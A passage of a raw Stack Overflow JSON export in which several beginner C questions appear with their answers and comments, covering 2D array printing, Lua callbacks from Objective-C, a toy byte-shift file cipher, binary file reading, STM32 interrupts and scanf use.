<code>int</code>.</p>\n\n<pre><code>// C99 solution using a variable length array\n\nvoid print2DArray(size_t rows, size_t cols, int aRRay[rows][cols]) {\n  for (size_t r = 0; r &lt; rows; r++) {\n    for (size_t c = 0; c &lt; cols; c++) {\n      printf(\"%d \", aRRay[r][c]);\n    }\n    printf(\"\\n\");\n  }\n}\n</code></pre>\n\n<p>Sample use</p>\n\n<pre><code>#define ROWS 6\n#define COLS 7\n\nint main() {\n  int aRRay[ROWS][COLS];\n  size_t r, c;\n  int n = 0;\n  for (r = 0; r &lt; ROWS; r++) {\n    for (c = 0; c &lt; COLS; c++) {\n      aRRay[r][c] = ++n;\n    }\n  }\n  print2DArray(ROWS, COLS, aRRay);\n  int bRRay[2][3] = {{11,12,13}, {14,15,16}};\n  print2DArray(2,3, bRRay);\n}\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>1 2 3 4 5 6 7 \n8 9 10 11 12 13 14 \n15 16 17 18 19 20 21 \n22 23 24 25 26 27 28 \n29 30 31 32 33 34 35 \n36 37 38 39 40 41 42 \n11 12 13 \n14 15 16 \n</code></pre>\n\n<p>OP had \"I'm supposed to use the random number generator to create the numbers for my 2D array \" which is fine.  The above use <code>++n</code> as it is more illustrative.</p>\n\n<p>See also <a href=\"https://stackoverflow.com/q/14548753/2410359\">Passing a multidimensional variable length array to a function</a>.</p>\n"}], "owner": {"reputation": 1, "user_id": 10778779, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd80e28250fdcbb204d6b56487254397?s=128&d=identicon&r=PG&f=1", "display_name": "doktte", "link": "https://stackoverflow.com/users/10778779/doktte"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 59, "favorite_count": 0, "answer_count": 2, "score": -4, "last_activity_date": 1544593782, "creation_date": 1544585447, "question_id": 53735643, "link": "https://stackoverflow.com/questions/53735643/how-do-i-print-out-a-2d-array-that-is-initialized-in-function-main-in-c", "title": "How do I print out a 2D array that is initialized in function main in C?", "body": "<pre><code>void print2DArray(int aRRay[][COLS], int r, int c);\nint main()\n{\n    int aRRay[ROWS][COLS];\n    int n;\n\n    int r, c;\n    srand(time(NULL));\n    for (r = 0; r &lt; ROWS; r++)\n    {\n        for (c = 0; c &lt; COLS; c++)\n        {\n            aRRay[r][c] = -40 + rand() % (80 + 1 - (-40));\n        }\n    }\n\nprint2DArray(aRRay[r][c], r, c);\n\nprintf(\"Enter an integer between -40 and 80: \\n\");\nscanf(\"%d\", &amp;n);\nwhile (n &gt;= 40 || n &lt;= -80)\n{\n    printf(\"Thie is an invalid integer, please re-enter an integer between \n     -80 and 40\");\n    scanf(\"%d\", &amp;n);\n}\n\nreturn 0;\n}\nvoid print2DArray(int aRRay[][COLS], int r, int c) \nstatement\n{\nint j, k;\nfor (j = 0; j &lt; ROWS; j++)\n{\n    for (k = 0; k &lt; COLS; k++)\n    {\n        printf(\"%d \", aRRay[r][c]);\n    }\n    printf(\"\\n\");\n}\n}\n</code></pre>\n\n<p>How do I print out a 2D array that is initialized in function main in C? \nHow do I get the function to work? I'm supposed to use the random number generator to create the numbers for my 2D array and then print it out in a void function.</p>\n"}, {"tags": ["c", "objective-c", "asynchronous", "lua"], "comments": [{"owner": {"reputation": 9718, "user_id": 1424244, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/d8d370542399af1afe3202ed1fc1ab88?s=128&d=identicon&r=PG", "display_name": "IS4", "link": "https://stackoverflow.com/users/1424244/is4"}, "edited": false, "score": 1, "creation_date": 1544662802, "post_id": 53735593, "comment_id": 94359980, "body": "When the callback is invoked, the Lua stack will be in a completely different state, since other code is run after the function. You have to find some globally-accessible table (preferably the registry or a table inside) and use <code>luaL_ref</code> to place the function in the table and obtain a reference to it. You can store the reference (as an integer) then, and once the callback is invoked, fetch the function from the table via the index (and call <code>luaL_unref</code>). Just be sure the callback isn&#39;t invoked in another thread, since Lua doesn&#39;t like that. ;-)"}], "owner": {"reputation": 2589, "user_id": 385127, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/rX6UN.png?s=128&g=1", "display_name": "Suge", "link": "https://stackoverflow.com/users/385127/suge"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 77, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1544585029, "creation_date": 1544585029, "question_id": 53735593, "link": "https://stackoverflow.com/questions/53735593/how-to-asynchronously-callback-lua-function-in-c-objective-c", "title": "How to asynchronously callback Lua function in C/Objective-C?", "body": "<p>I want to wrap http request of Objective-C to Lua, but I don't know how to asynchronously call the function parameter passed in. When I use <code>lua_State</code> inside the callback function, it's invalid.\nCan anyone help?</p>\n\n<pre><code>/*\n Usage in Lua:\n\n function successHandler(result)\n    print('success: '..result)\n end\n\n function failureHandler(error)\n    print('failure: '..error)\n end\n\n httpRequest(urlString, successHandler, failureHandler)\n*/\nstatic int httpRequestProxy(lua_State *L)\n{\n    size_t l;\n\n    const char * url_ = luaL_checklstring(L, 1, &amp;l);\n    NSString *url = [NSString stringWithUTF8String:url_];\n\n    [HttpManager request:url success:^(NSString * result) {\n        NSLog(@\"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; lua state top: %d\", lua_gettop(L)); // return 0\n\n        NSLog(@\"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; success: %@\", result);\n\n        if (lua_isfunction(L, 2))\n        {\n            lua_pushstring(L, [result cStringUsingEncoding:NSUTF8StringEncoding]);\n            lua_call(L, 1, 0);\n        }\n    } failure:^(NSError * _Nonnull error) {\n        NSLog(@\"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; failure: %@\", error.localizedDescription);\n\n        if (lua_isfunction(L, 3))\n        {\n            lua_pushstring(L, [error.localizedDescription cStringUsingEncoding:NSUTF8StringEncoding]);\n            lua_call(L, 1, 0);\n        }\n    }];\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "encryption"], "comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 5, "creation_date": 1544584155, "post_id": 53735420, "comment_id": 94324243, "body": "You can&#39;t read and write to the file like that. When you read, the file position is advanced. So when you write, you&#39;re overwriting the next character. Try opening two files. Read from one, and write to the other."}, {"owner": {"reputation": 489, "user_id": 5081047, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/99300c8c43d47c91299eb7b774910843?s=128&d=identicon&r=PG&f=1", "display_name": "Byte", "link": "https://stackoverflow.com/users/5081047/byte"}, "edited": false, "score": 1, "creation_date": 1544585344, "post_id": 53735420, "comment_id": 94324481, "body": "In theory, you could also use <code>fseek</code> to move the file position back to overwrite the byte you read. I say &quot;in theory&quot; because you may or may not also need to be aware of buffering, which would require flushing the output before doing the next read. I&#39;m not sure it&#39;s necessary in this case, but would be good to read up on that if you encounter unusual behavior in your program."}, {"owner": {"reputation": 36469, "user_id": 238704, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/VgOZI.png?s=128&g=1", "display_name": "President James K. Polk", "link": "https://stackoverflow.com/users/238704/president-james-k-polk"}, "edited": false, "score": 3, "creation_date": 1544585421, "post_id": 53735420, "comment_id": 94324499, "body": "Although I suppose you could <code>fseek(file, -1, SEEK_CUR);</code> before <code>fputc()</code>. <i>In update mode (&#39;+&#39;), both input and output may be performed, but output cannot be followed by input without an intervening call to fflush, fseek, fsetpos or rewind, and input cannot be followed by output without an intervening call to fseek, fsetpos or rewind, unless the input operation encountered end of file. In update mode, implementations are permitted to use binary mode even when text mode is specified.</i>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544586176, "post_id": 53735420, "comment_id": 94324626, "body": "Use <code>int</code>, not <code>char byte;</code>  Open a separate destination file in binary mode."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 489, "user_id": 5081047, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/99300c8c43d47c91299eb7b774910843?s=128&d=identicon&r=PG&f=1", "display_name": "Byte", "link": "https://stackoverflow.com/users/5081047/byte"}, "edited": false, "score": 0, "creation_date": 1544586832, "post_id": 53735420, "comment_id": 94324746, "body": "@Byte: you need to seek as you switch between read and write (and as you switch between write and read), but there&#39;s no direct need to worry about buffering.  For performance reasons (if no other), you&#39;d do better reading big chunks of file, revising them, and then writing them back, but the buffering actually copes remarkably well."}], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user7412484"}, "is_accepted": true, "score": 0, "last_activity_date": 1544654409, "creation_date": 1544654409, "answer_id": 53752467, "question_id": 53735420, "link": "https://stackoverflow.com/questions/53735420/subtracting-added-number-from-txt-characters-doesnt-reverse-encryption/53752467#53752467", "title": "Subtracting added number from .txt characters doesn&#39;t reverse encryption?", "body": "<p>Here's how my new encrypt function looks</p>\n\n<pre><code>void encrypt(char filePath[],int key) {\n    FILE * fileR;\n    FILE * fileW;\n    char dest[500],src[4];\n    int byte;\n    fileR = fopen(filePath,\"r\");\n    //Combines filePath with ext for unique filename\n    strcpy(dest,filePath);\n    strcpy(src,ext);\n    fileW = fopen(strcat(dest,src),\"w\");\n    while( (byte = fgetc(fileR)) != EOF) {\n        fputc(byte+key,fileW);\n    }\n    fclose(fileR);\n    fclose(fileW);\n}\n</code></pre>\n\n<p>It works as intended now.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7412484"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 53752467, "answer_count": 1, "score": 1, "last_activity_date": 1544654409, "creation_date": 1544583504, "last_edit_date": 1544584377, "question_id": 53735420, "link": "https://stackoverflow.com/questions/53735420/subtracting-added-number-from-txt-characters-doesnt-reverse-encryption", "title": "Subtracting added number from .txt characters doesn&#39;t reverse encryption?", "body": "<p>When encrypting a text file and then running the algorithm with \"byte-key\" to undo the encryption, it just changes the jumbled text and doesn't actually reverse anything. Is there some concept I'm missing?</p>\n\n<pre><code>void encrypt(char filePath[],int key) {\n    FILE * file;\n    char byte;\n    file = fopen(filePath,\"r+\");\n    while( (byte = fgetc(file)) != EOF) {\n        fputc(byte+key,file);\n    }\n    fclose(file);\n}\n</code></pre>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544585850, "post_id": 53735352, "comment_id": 94324568, "body": "Should <code>fread(&amp;pn,sizeof(int),k,fp);</code> be <code>fread(&amp;pn,sizeof(int),1,fp);</code> ?  Other problems exist too."}, {"owner": {"reputation": 591, "user_id": 7791328, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1TP4d.png?s=128&g=1", "display_name": "iVoid", "link": "https://stackoverflow.com/users/7791328/ivoid"}, "edited": false, "score": 0, "creation_date": 1544586737, "post_id": 53735352, "comment_id": 94324723, "body": "Check the order in which you read in your reading program. If you write as <code>pn, q, p</code> you should read in that order too."}, {"owner": {"reputation": 32386, "user_id": 4706785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fdee2789e9bac57bfdd97abc4e533a4d?s=128&d=identicon&r=PG&f=1", "display_name": "Peter", "link": "https://stackoverflow.com/users/4706785/peter"}, "edited": false, "score": 0, "creation_date": 1544607417, "post_id": 53735352, "comment_id": 94332604, "body": "<code>fwrite(&amp;pn,sizeof(int),k,fp)</code> should not have the ampersand (<code>&amp;</code>).   Same for the corresponding <code>fread()</code> calls.     Same for the other dynamically allocated memory.     Saving pointers to a file (as distinct from what the pointers point at) and then reading in typically yields undefined behaviour."}], "answers": [{"tags": [], "owner": {"reputation": 489, "user_id": 5081047, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/99300c8c43d47c91299eb7b774910843?s=128&d=identicon&r=PG&f=1", "display_name": "Byte", "link": "https://stackoverflow.com/users/5081047/byte"}, "is_accepted": false, "score": 0, "last_activity_date": 1544587186, "creation_date": 1544587186, "answer_id": 53735862, "question_id": 53735352, "link": "https://stackoverflow.com/questions/53735352/why-am-i-getting-undefined-values-from-reading-a-binary-file-in-c/53735862#53735862", "title": "Why am I getting undefined values from reading a binary file in c?", "body": "<p>You did not initialize <code>int holdr</code>. So <code>while(holdr!=0)</code> is undefined behavior. There's no telling what that variable holds, so your loop may or may not even begin.</p>\n\n<p>The calls to <code>realloc</code> appear immediately after you allocated memory with <code>malloc</code>, but there is no test to see if you need additional space. Usually one would write something like <code>if (not_enough_space) realloc(something)</code>. Your code (assuming it even runs past that undefined behavior noted earlier), will just allocate space for a single integer for pn and q, and space for a single float for p, voiding the need for the malloc in the first place.</p>\n\n<p>You said that your results do not change... This is due to the fact that your arrays are constantly re-allocated and values are stored to them without you writing the results to the file. It just loops infinitely, asking for user input until <code>pn[0]</code> happens to become 0.</p>\n\n<p>In the second source file, <code>int i</code> must be initialized before use.</p>\n\n<p>There is no reason to cast the result of malloc. pointers to void are basically typeless memory addresses.</p>\n"}, {"tags": [], "owner": {"reputation": 591, "user_id": 7791328, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1TP4d.png?s=128&g=1", "display_name": "iVoid", "link": "https://stackoverflow.com/users/7791328/ivoid"}, "is_accepted": false, "score": 2, "last_activity_date": 1544588590, "creation_date": 1544588590, "answer_id": 53736051, "question_id": 53735352, "link": "https://stackoverflow.com/questions/53735352/why-am-i-getting-undefined-values-from-reading-a-binary-file-in-c/53736051#53736051", "title": "Why am I getting undefined values from reading a binary file in c?", "body": "<p>There are multiple issues with your program. First, for the program to run at all, you need to define <code>holdr</code> to non-zero value.</p>\n\n<pre><code>int i=0, holdr=1, k=0;\n</code></pre>\n\n<p>The first step in debugging file write/read issues is to inspect the file written by your program. On hexdump'ing the output file, I saw that the file contained only garbage values, so your write program itself is broken. With this info, if we look at your code, the reason why your program writes out garbage values is because of using address operator on an already pointer type in <code>fwrite</code></p>\n\n<pre><code>fwrite(&amp;i,sizeof(int),1,fp);      //this is okay, i is an int, &amp;i is int*\nfwrite(&amp;pn,sizeof(int),k,fp);     //this is not okay, pn is int*, &amp;pn is int**\n</code></pre>\n\n<p>Essentially you're writing the address of your array to the file instead of contents of your array. So, while reading back you'll get the addresses of your array - which would appear garbage.</p>\n\n<p>Along with fixing so many other issues in your program, remove the <code>&amp;</code> from fwrite of the arrays, then your program would write proper values and hence your reading program also can read the right values.</p>\n\n<pre><code>fwrite(pn,sizeof(int),k,fp);     //this is the right usage, pn is int*\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 10508953, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4e2615a105ccf8d8ac65c1baad5a1a1f?s=128&d=identicon&r=PG&f=1", "display_name": "steakfry", "link": "https://stackoverflow.com/users/10508953/steakfry"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 127, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1544588590, "creation_date": 1544582857, "question_id": 53735352, "link": "https://stackoverflow.com/questions/53735352/why-am-i-getting-undefined-values-from-reading-a-binary-file-in-c", "title": "Why am I getting undefined values from reading a binary file in c?", "body": "<p>I am writing a program that stores inventory (three arrays of numbers) using dynamically allocated arrays and storing the arrays in a binary file called \"inventory.txt\". The problem/question I have is I am getting really weird numbers in the arrays when I print them out. the program is incorrectly reading the binary file, the size of the arrays gets read into the program as the correct amount of elements are displayed and the numbers don't change through multiple iterations.   How do I read the numbers correctly so the program displays the correct numbers??</p>\n\n<p>There are two programs, the first creates a binary file \"inventory.txt\" and continuously puts three variables part number, quantity, and price into a dynamically allocated array that increases with each entry and ends when the user enters 0 for part number(just enter one 0). The second program just reads the arrays and the array size stored in the binary file \"inventory.txt\" and prints \"i\" amount of rows with the numbers stored in them. Here are the two programs.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n\n\n\n//THIS IS FIRST PROGRAM THAT STORES THE ARRAY BASED ON USER INPUT\nint main(){\n printf(\"This program stores an invetory: \");//declarations\n int i=0, holdr, k=0;\n int *pn, *q;\n float *p;\n\n\n q=malloc(sizeof(int));\n pn=malloc(sizeof(int));      //allocate space\n p=malloc(sizeof(float));\n\n\n\n\n\n FILE *fp;\n fp=fopen(\"inventory.txt\",\"w+b\");    //open file\n\n\n\n\n while(holdr!=0){\n pn=realloc(pn, (i+1) * sizeof(int));    //read data into the three arrays\n q=realloc(q, (i+1) * sizeof(int));\n p=realloc(p, (i+1) * sizeof(float));\n printf(\"Please enter item data (part number, quantity, price): \");\n scanf(\"%d,%d,%f\",&amp;pn[i],&amp;q[i],&amp;p[i]);\n holdr=pn[i];\n i++;\n k++;\n }\n\n\n\n\n fwrite(&amp;i,sizeof(int),1,fp);               //write arrays to inventory.txt(binary)\n fwrite(&amp;pn,sizeof(int),k,fp);\n fwrite(&amp;q,sizeof(int),k,fp);\n fwrite(&amp;p,sizeof(float),k,fp);\n printf(\"Thank you. Inventory stored in inventory.txt. \\n\"); \n\n\n fp=fopen(\"inventory.txt\",\"r+b\");        //Check to see if file is correct by printing from the file inside the same program.\n\n\n if (fp == NULL){\n printf(\"nah\");\n exit(EXIT_FAILURE);\n }\n\n for(i=0;i&lt;k;i++){\n fread(&amp;pn,sizeof(int),k,fp);     //THIS DISPLAYS THE ARRAYS CORRECTLY AS ENTERED\n printf(\"%d\\t\" , pn[i]);\n fread(&amp;q,sizeof(int),k,fp);\n printf(\"%d\\t\", q[i]);\n fread(&amp;p,sizeof(int),k,fp);\n printf(\"%f\\n\", p[i]);}\n\n fclose(fp);\n return 0;\n}\n</code></pre>\n\n<p>And then...</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n//THE SECOND FILE THAT PRINTS OUT THE ARRAYS FROM THE FIRST PROGRAM\nint main(){\n\n\nFILE *fp = fopen(\"inventory.txt\",\"r+b\");  //declarations\n\nif (fp == NULL){      //check file\nprintf(\"nah\");\nexit(EXIT_FAILURE);\n}\nint i;\nfread(&amp;i,sizeof(int),1,fp); //get size of arrays from \"i\" in the other program, THIS PART WORKS \n\n\nint l,k;\nint *pn, *q;\nfloat *p;\n\n\nq  = (int *)malloc(i * sizeof(int));  // TODO - check malloc() OK\npn = (int *)malloc(i * sizeof(int));  // TODO - check malloc() OK\np  = (float *)malloc(i * sizeof(float));  // TODO - check malloc() OK\n\n\nfread( q, sizeof( int ), i, fp );   //read arrays in file into program\nfread( p, sizeof( float ), i, fp );\nfread( pn, sizeof( int ), i, fp );\n\n\nprintf(\"Below are the items in your inventory.\\nPart#\\tQuantity\\tPrice\\n\");   \nfor(l=0;l&lt;i;l++){                   //THIS DISPLAYS WEIRD ASS NUMBERS\n\nprintf(\"%d\\t\" , pn[l]);\n\nprintf(\"%d\\t\", q[l]);\n\nprintf(\"%f\\n\", p[l]);}\nrewind(fp);\nfclose(fp);\nreturn 0;}\n</code></pre>\n"}, {"tags": ["c", "embedded", "stm32"], "comments": [{"owner": {"reputation": 1052, "user_id": 3698648, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/199b49d13342baa233c08aac5793ed4d?s=128&d=identicon&r=PG&f=1", "display_name": "ntshetty", "link": "https://stackoverflow.com/users/3698648/ntshetty"}, "edited": false, "score": 0, "creation_date": 1544582441, "post_id": 53735181, "comment_id": 94323922, "body": "<code>it does not work</code> means did you verify the actually values setting to Interrupt register ??"}, {"owner": {"reputation": 765, "user_id": 10143388, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e95f5ed267f8601015469bc5617750a?s=128&d=identicon&r=PG&f=1", "display_name": "A.R.C.", "link": "https://stackoverflow.com/users/10143388/a-r-c"}, "edited": false, "score": 0, "creation_date": 1544597770, "post_id": 53735181, "comment_id": 94327918, "body": "It&#39;s not working means, the ISR Handler is not triggered?"}, {"owner": {"reputation": 1, "user_id": 10777927, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0f528d3bed3f8ba6ee40fdadf4bd2cc?s=128&d=identicon&r=PG&f=1", "display_name": "Santiago PO.", "link": "https://stackoverflow.com/users/10777927/santiago-po"}, "edited": false, "score": 0, "creation_date": 1544670489, "post_id": 53735181, "comment_id": 94361612, "body": "Thiru: Yes, I verified all needed registers were set when debugging. And the peripheral was also working ."}, {"owner": {"reputation": 1, "user_id": 10777927, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0f528d3bed3f8ba6ee40fdadf4bd2cc?s=128&d=identicon&r=PG&f=1", "display_name": "Santiago PO.", "link": "https://stackoverflow.com/users/10777927/santiago-po"}, "edited": false, "score": 0, "creation_date": 1544671092, "post_id": 53735181, "comment_id": 94361765, "body": "A.R.C:  yes, that&#39;s why I meant kind of. I couldn&#39;t check the handler was actually triggered but I supposed that since it seemed that a communication between the NVIC and the external interrupt line."}, {"owner": {"reputation": 1, "user_id": 10777927, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0f528d3bed3f8ba6ee40fdadf4bd2cc?s=128&d=identicon&r=PG&f=1", "display_name": "Santiago PO.", "link": "https://stackoverflow.com/users/10777927/santiago-po"}, "edited": false, "score": 0, "creation_date": 1544671585, "post_id": 53735181, "comment_id": 94361870, "body": "But I managed to solve it. The lines I was missing was to enable all configurable interrupts and that the setting of the interrupt was after the setting of the GPIO port. Additionally I had to define what the IRQ handler for that external interrupt will do. THIS website helped me understand better.<a href=\"http://www.eng.auburn.edu/~nelson/courses/elec5260_6260/slides/ARM%20STM32F407%20Interrupts.pdf\" rel=\"nofollow noreferrer\">eng.auburn.edu/~nelson/courses/elec5260_6260/slides/&hellip;</a>"}], "owner": {"reputation": 1, "user_id": 10777927, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0f528d3bed3f8ba6ee40fdadf4bd2cc?s=128&d=identicon&r=PG&f=1", "display_name": "Santiago PO.", "link": "https://stackoverflow.com/users/10777927/santiago-po"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 91, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1544581334, "creation_date": 1544581334, "question_id": 53735181, "link": "https://stackoverflow.com/questions/53735181/problem-enabling-a-nvic-irqn-channel-in-the-stm32f407", "title": "Problem enabling a NVIC IRQn channel in the STM32F407", "body": "<p>I am trying to use the NVIC controller to see when the data is available from a peripheral. The peripheral is connected to an external interrupt line through a GPIO port pin. I have configured this pin to work as an external interrupt and from has an interrupt number equal to IRQn (as seen in the functions).</p>\n\n<pre><code>HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4); //This has all 4 bits as preemption priority bits\nHAL_NVIC_SetPriority(IRQn, 0, 0);\nHAL_NVIC_EnableIRQ(IRQn);\n</code></pre>\n\n<p>The problem lies when I am trying to use the function below</p>\n\n<pre><code>HAL_NVIC_GetPendingIRQ(IRQn)\n</code></pre>\n\n<p>My code will still run because when an interrupt is not active it is still in the pending state. I don't know if the problem may exist inside the processor and some configurations I am missing. Online I find that the previous lines are enough to implement the NVIC but it does not work.</p>\n\n<p>PS: This is programmed in the C language and I am using the HAL driver macros and functions as you can see by the HAL- prefix. Additionally, when polling to this specific external interrupt line, it works fine\ni.e.</p>\n\n<pre><code>__HAL_GPIO_EXTI_GET_IT();\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 2, "creation_date": 1544580833, "post_id": 53735082, "comment_id": 94323602, "body": "<code>char a[I+1] = {a[I+1] = &#39;\\0&#39;}, q;</code> is an error, if you do not see an error message then please adjust your compiler settings as you are missing out on important information"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 2, "creation_date": 1544580890, "post_id": 53735082, "comment_id": 94323617, "body": "also can you explain how you imagine to store 127 characters of input in the single character <code>q</code> ?"}], "answers": [{"comments": [{"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 1, "user_id": 10778364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5c2e4d2761583d762cdc8038425dcca?s=128&d=identicon&r=PG&f=1", "display_name": "Caan", "link": "https://stackoverflow.com/users/10778364/caan"}, "edited": false, "score": 0, "creation_date": 1544583749, "post_id": 53735188, "comment_id": 94324161, "body": "@Caan I have fixed them"}, {"owner": {"reputation": 1, "user_id": 10778364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5c2e4d2761583d762cdc8038425dcca?s=128&d=identicon&r=PG&f=1", "display_name": "Caan", "link": "https://stackoverflow.com/users/10778364/caan"}, "edited": false, "score": 0, "creation_date": 1544584770, "post_id": 53735188, "comment_id": 94324359, "body": "<a href=\"https://prnt.sc/lttf90\" rel=\"nofollow noreferrer\">Screenshot_2 for 1st Solution</a> &amp;  <a href=\"https://prnt.sc/lttgfd\" rel=\"nofollow noreferrer\">Screenshot_2 for 2nd Solution</a>"}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 1, "user_id": 10778364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5c2e4d2761583d762cdc8038425dcca?s=128&d=identicon&r=PG&f=1", "display_name": "Caan", "link": "https://stackoverflow.com/users/10778364/caan"}, "edited": false, "score": 0, "creation_date": 1544596727, "post_id": 53735188, "comment_id": 94327507, "body": "@Caan the first solution does not discard the newline typed after each character, so it carries into the next read. What are you trying to point out about the second solution? The screenshot is not descriptive. To read a line of text on one go, use <code>fgets()</code> or <code>getline()</code> instead of <code>scanf()</code>."}, {"owner": {"reputation": 1, "user_id": 10778364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5c2e4d2761583d762cdc8038425dcca?s=128&d=identicon&r=PG&f=1", "display_name": "Caan", "link": "https://stackoverflow.com/users/10778364/caan"}, "edited": false, "score": 0, "creation_date": 1544626222, "post_id": 53735188, "comment_id": 94343528, "body": "The 2nd solution just hangs after 1st response at the point as in in the screenshot."}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 1, "user_id": 10778364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5c2e4d2761583d762cdc8038425dcca?s=128&d=identicon&r=PG&f=1", "display_name": "Caan", "link": "https://stackoverflow.com/users/10778364/caan"}, "edited": false, "score": 0, "creation_date": 1544634239, "post_id": 53735188, "comment_id": 94348311, "body": "@Caan <code>&quot;%5[^\\\\n]&quot;</code> should be <code>&quot;%5[^\\n]&quot;</code>. But also see <a href=\"https://stackoverflow.com/questions/35255891/\">Why won&#39;t this scanf format-string work?</a>"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1544651618, "post_id": 53735188, "comment_id": 94356599, "body": "The <code>{}</code> initializer is not valid in C; it probably is valid in modern C++.  You omitted the traditional <code>&quot;&quot;</code> which also works, with or without the enclosing braces."}], "tags": [], "owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "is_accepted": false, "score": 0, "last_activity_date": 1544634410, "last_edit_date": 1544634410, "creation_date": 1544581378, "answer_id": 53735188, "question_id": 53735082, "link": "https://stackoverflow.com/questions/53735082/character-array-user-input-scanf/53735188#53735188", "title": "Character Array User Input Scanf", "body": "<p><code>char a[I+1] = 